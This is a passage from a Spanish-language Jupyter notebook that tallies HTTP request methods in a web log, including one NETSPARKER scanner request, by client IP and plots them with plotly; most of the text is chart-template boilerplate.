       "array(['GET', 'HEAD', 'NETSPARKER', 'POST', 'OPTIONS', 'PROPFIND'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Method'].unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Method</th>\n",
       "      <th>count</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>POST</td>\n",
       "      <td>4973</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>GET</td>\n",
       "      <td>4091</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>HEAD</td>\n",
       "      <td>1940</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>OPTIONS</td>\n",
       "      <td>21</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>PROPFIND</td>\n",
       "      <td>19</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>NETSPARKER</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       Method  count\n",
       "0        POST   4973\n",
       "1         GET   4091\n",
       "2        HEAD   1940\n",
       "3     OPTIONS     21\n",
       "4    PROPFIND     19\n",
       "5  NETSPARKER      1"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "metodos = df['Method'].value_counts().reset_index()\n",
    "metodos"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.plotly.v1+json": {
       "config": {
        "plotlyServerURL": "https://plot.ly"
       },
       "data": [
        {
         "alignmentgroup": "True",
         "hovertemplate": "Method=%{x}<br>count=%{y}<extra></extra>",
         "legendgroup": "POST",
         "marker": {
          "color": "#636efa",
          "pattern": {
           "shape": ""
          }
         },
         "name": "POST",
         "offsetgroup": "POST",
         "orientation": "v",
         "showlegend": true,
         "textposition": "auto",
         "type": "bar",
         "x": [
          "POST"
         ],
         "xaxis": "x",
         "y": [
          4973
         ],
         "yaxis": "y"
        },
        {
         "alignmentgroup": "True",
         "hovertemplate": "Method=%{x}<br>count=%{y}<extra></extra>",
         "legendgroup": "GET",
         "marker": {
          "color": "#EF553B",
          "pattern": {
           "shape": ""
          }
         },
         "name": "GET",
         "offsetgroup": "GET",
         "orientation": "v",
         "showlegend": true,
         "textposition": "auto",
         "type": "bar",
         "x": [
          "GET"
         ],
         "xaxis": "x",
         "y": [
          4091
         ],
         "yaxis": "y"
        },
        {
         "alignmentgroup": "True",
         "hovertemplate": "Method=%{x}<br>count=%{y}<extra></extra>",
         "legendgroup": "HEAD",
         "marker": {
          "color": "#00cc96",
          "pattern": {
           "shape": ""
          }
         },
         "name": "HEAD",
         "offsetgroup": "HEAD",
         "orientation": "v",
         "showlegend": true,
         "textposition": "auto",
         "type": "bar",
         "x": [
          "HEAD"
         ],
         "xaxis": "x",
         "y": [
          1940
         ],
         "yaxis": "y"
        },
        {
         "alignmentgroup": "True",
         "hovertemplate": "Method=%{x}<br>count=%{y}<extra></extra>",
         "legendgroup": "OPTIONS",
         "marker": {
          "color": "#ab63fa",
          "pattern": {
           "shape": ""
          }
         },
         "name": "OPTIONS",
         "offsetgroup": "OPTIONS",
         "orientation": "v",
         "showlegend": true,
         "textposition": "auto",
         "type": "bar",
         "x": [
          "OPTIONS"
         ],
         "xaxis": "x",
         "y": [
          21
         ],
         "yaxis": "y"
        },
        {
         "alignmentgroup": "True",
         "hovertemplate": "Method=%{x}<br>count=%{y}<extra></extra>",
         "legendgroup": "PROPFIND",
         "marker": {
          "color": "#FFA15A",
          "pattern": {
           "shape": ""
          }
         },
         "name": "PROPFIND",
         "offsetgroup": "PROPFIND",
         "orientation": "v",
         "showlegend": true,
         "textposition": "auto",
         "type": "bar",
         "x": [
          "PROPFIND"
         ],
         "xaxis": "x",
         "y": [
          19
         ],
         "yaxis": "y"
        },
        {
         "alignmentgroup": "True",
         "hovertemplate": "Method=%{x}<br>count=%{y}<extra></extra>",
         "legendgroup": "NETSPARKER",
         "marker": {
          "color": "#19d3f3",
          "pattern": {
           "shape": ""
          }
         },
         "name": "NETSPARKER",
         "offsetgroup": "NETSPARKER",
         "orientation": "v",
         "showlegend": true,
         "textposition": "auto",
         "type": "bar",
         "x": [
          "NETSPARKER"
         ],
         "xaxis": "x",
         "y": [
          1
         ],
         "yaxis": "y"
        }
       ],
       "layout": {
        "barmode": "relative",
        "legend": {
         "title": {
          "text": "Method"
         },
         "tracegroupgap": 0
        },
        "template": {
         "data": {
          "bar": [
           {
            "error_x": {
             "color": "#2a3f5f"
            },
            "error_y": {
             "color": "#2a3f5f"
            },
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "bar"
           }
          ],
          "barpolar": [
           {
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "barpolar"
           }
          ],
          "carpet": [
           {
            "aaxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "baxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "type": "carpet"
           }
          ],
          "choropleth": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "choropleth"
           }
          ],
          "contour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "contour"
           }
          ],
          "contourcarpet": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "contourcarpet"
           }
          ],
          "heatmap": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmap"
           }
          ],
          "heatmapgl": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmapgl"
           }
          ],
          "histogram": [
           {
            "marker": {
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "histogram"
           }
          ],
          "histogram2d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2d"
           }
          ],
          "histogram2dcontour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2dcontour"
           }
          ],
          "mesh3d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "mesh3d"
           }
          ],
          "parcoords": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "parcoords"
           }
          ],
          "pie": [
           {
            "automargin": true,
            "type": "pie"
           }
          ],
          "scatter": [
           {
            "fillpattern": {
             "fillmode": "overlay",
             "size": 10,
             "solidity": 0.2
            },
            "type": "scatter"
           }
          ],
          "scatter3d": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatter3d"
           }
          ],
          "scattercarpet": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattercarpet"
           }
          ],
          "scattergeo": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergeo"
           }
          ],
          "scattergl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergl"
           }
          ],
          "scattermapbox": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattermapbox"
           }
          ],
          "scatterpolar": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolar"
           }
          ],
          "scatterpolargl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolargl"
           }
          ],
          "scatterternary": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterternary"
           }
          ],
          "surface": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "surface"
           }
          ],
          "table": [
           {
            "cells": {
             "fill": {
              "color": "#EBF0F8"
             },
             "line": {
              "color": "white"
             }
            },
            "header": {
             "fill": {
              "color": "#C8D4E3"
             },
             "line": {
              "color": "white"
             }
            },
            "type": "table"
           }
          ]
         },
         "layout": {
          "annotationdefaults": {
           "arrowcolor": "#2a3f5f",
           "arrowhead": 0,
           "arrowwidth": 1
          },
          "autotypenumbers": "strict",
          "coloraxis": {
           "colorbar": {
            "outlinewidth": 0,
            "ticks": ""
           }
          },
          "colorscale": {
           "diverging": [
            [
             0,
             "#8e0152"
            ],
            [
             0.1,
             "#c51b7d"
            ],
            [
             0.2,
             "#de77ae"
            ],
            [
             0.3,
             "#f1b6da"
            ],
            [
             0.4,
             "#fde0ef"
            ],
            [
             0.5,
             "#f7f7f7"
            ],
            [
             0.6,
             "#e6f5d0"
            ],
            [
             0.7,
             "#b8e186"
            ],
            [
             0.8,
             "#7fbc41"
            ],
            [
             0.9,
             "#4d9221"
            ],
            [
             1,
             "#276419"
            ]
           ],
           "sequential": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ],
           "sequentialminus": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ]
          },
          "colorway": [
           "#636efa",
           "#EF553B",
           "#00cc96",
           "#ab63fa",
           "#FFA15A",
           "#19d3f3",
           "#FF6692",
           "#B6E880",
           "#FF97FF",
           "#FECB52"
          ],
          "font": {
           "color": "#2a3f5f"
          },
          "geo": {
           "bgcolor": "white",
           "lakecolor": "white",
           "landcolor": "#E5ECF6",
           "showlakes": true,
           "showland": true,
           "subunitcolor": "white"
          },
          "hoverlabel": {
           "align": "left"
          },
          "hovermode": "closest",
          "mapbox": {
           "style": "light"
          },
          "paper_bgcolor": "white",
          "plot_bgcolor": "#E5ECF6",
          "polar": {
           "angularaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "radialaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "scene": {
           "xaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "yaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "zaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           }
          },
          "shapedefaults": {
           "line": {
            "color": "#2a3f5f"
           }
          },
          "ternary": {
           "aaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "baxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "caxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "title": {
           "x": 0.05
          },
          "xaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          },
          "yaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          }
         }
        },
        "title": {
         "text": "Distribución de los métodos"
        },
        "xaxis": {
         "anchor": "y",
         "categoryarray": [
          "POST",
          "GET",
          "HEAD",
          "OPTIONS",
          "PROPFIND",
          "NETSPARKER"
         ],
         "categoryorder": "array",
         "domain": [
          0,
          1
         ],
         "title": {
          "text": "Method"
         }
        },
        "yaxis": {
         "anchor": "x",
         "domain": [
          0,
          1
         ],
         "title": {
          "text": "count"
         }
        }
       }
      }
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "fig = px.bar(metodos, x='Method', y='count', color='Method', title='Distribución de los métodos')\n",
    "\n",
    "# Mostrar el gráfico\n",
    "fig.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Method</th>\n",
       "      <th>count</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>GET</td>\n",
       "      <td>3111</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>1940</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>POST</td>\n",
       "      <td>286</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>OPTIONS</td>\n",
       "      <td>21</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>PROPFIND</td>\n",
       "      <td>19</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>NETSPARKER</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>POST</td>\n",
       "      <td>4687</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>GET</td>\n",
       "      <td>980</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       Client IP      Method  count\n",
       "0  192.168.4.164         GET   3111\n",
       "1  192.168.4.164        HEAD   1940\n",
       "2  192.168.4.164        POST    286\n",
       "3  192.168.4.164     OPTIONS     21\n",
       "4  192.168.4.164    PROPFIND     19\n",
       "5  192.168.4.164  NETSPARKER      1\n",
       "6   192.168.4.25        POST   4687\n",
       "7   192.168.4.25         GET    980"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "metodos = df.groupby('Client IP')['Method'].value_counts().reset_index()\n",
    "metodos"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.plotly.v1+json": {
       "config": {
        "plotlyServerURL": "https://plot.ly"
       },
       "data": [
        {
         "alignmentgroup": "True",
         "hovertemplate": "Client IP=192.168.4.164<br>Method=%{x}<br>count=%{y}<extra></extra>",
         "legendgroup": "192.168.4.164",
         "marker": {
          "color": "#636efa",
          "pattern": {
           "shape": ""
          }
         },
         "name": "192.168.4.164",
         "offsetgroup": "192.168.4.164",
         "orientation": "v",
         "showlegend": true,
         "textposition": "auto",
         "type": "bar",
         "x": [
          "GET",
          "HEAD",
          "POST",
          "OPTIONS",
          "PROPFIND",
          "NETSPARKER"
         ],
         "xaxis": "x",
         "y": [
          3111,
          1940,
          286,
          21,
          19,
          1
         ],
         "yaxis": "y"
        },
        {
         "alignmentgroup": "True",
         "hovertemplate": "Client IP=192.168.4.25<br>Method=%{x}<br>count=%{y}<extra></extra>",
         "legendgroup": "192.168.4.25",
         "marker": {
          "color": "#EF553B",
          "pattern": {
           "shape": ""
          }
         },
         "name": "192.168.4.25",
         "offsetgroup": "192.168.4.25",
         "orientation": "v",
         "showlegend": true,
         "textposition": "auto",
         "type": "bar",
         "x": [
          "POST",
          "GET"
         ],
         "xaxis": "x",
         "y": [
          4687,
          980
         ],
         "yaxis": "y"
        }
       ],
       "layout": {
        "barmode": "relative",
        "legend": {
         "title": {
          "text": "Client IP"
         },
         "tracegroupgap": 0
        },
        "template": {
         "data": {
          "bar": [
           {
            "error_x": {
             "color": "#2a3f5f"
            },
            "error_y": {
             "color": "#2a3f5f"
            },
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "bar"
           }
          ],
          "barpolar": [
           {
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "barpolar"
           }
          ],
          "carpet": [
           {
            "aaxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "baxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "type": "carpet"
           }
          ],
          "choropleth": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "choropleth"
           }
          ],
          "contour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "contour"
           }
          ],
          "contourcarpet": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "contourcarpet"
           }
          ],
          "heatmap": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmap"
           }
          ],
          "heatmapgl": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmapgl"
           }
          ],
          "histogram": [
           {
            "marker": {
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "histogram"
           }
          ],
          "histogram2d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2d"
           }
          ],
          "histogram2dcontour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2dcontour"
           }
          ],
          "mesh3d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "mesh3d"
           }
          ],
          "parcoords": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "parcoords"
           }
          ],
          "pie": [
           {
            "automargin": true,
            "type": "pie"
           }
          ],
          "scatter": [
           {
            "fillpattern": {
             "fillmode": "overlay",
             "size": 10,
             "solidity": 0.2
            },
            "type": "scatter"
           }
          ],
          "scatter3d": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatter3d"
           }
          ],
          "scattercarpet": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattercarpet"
           }
          ],
          "scattergeo": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergeo"
           }
          ],
          "scattergl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergl"
           }
          ],
          "scattermapbox": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattermapbox"
           }
          ],
          "scatterpolar": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolar"
           }
          ],
          "scatterpolargl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolargl"
           }
          ],
          "scatterternary": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterternary"
           }
          ],
          "surface": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "surface"
           }
          ],
          "table": [
           {
            "cells": {
             "fill": {
              "color": "#EBF0F8"
             },
             "line": {
              "color": "white"
             }
            },
            "header": {
             "fill": {
              "color": "#C8D4E3"
             },
             "line": {
              "color": "white"
             }
            },
            "type": "table"
           }
          ]
         },
         "layout": {
          "annotationdefaults": {
           "arrowcolor": "#2a3f5f",
           "arrowhead": 0,
           "arrowwidth": 1
          },
          "autotypenumbers": "strict",
          "coloraxis": {
           "colorbar": {
            "outlinewidth": 0,
            "ticks": ""
           }
          },
          "colorscale": {
           "diverging": [
            [
             0,
             "#8e0152"
            ],
            [
             0.1,
             "#c51b7d"
            ],
            [
             0.2,
             "#de77ae"
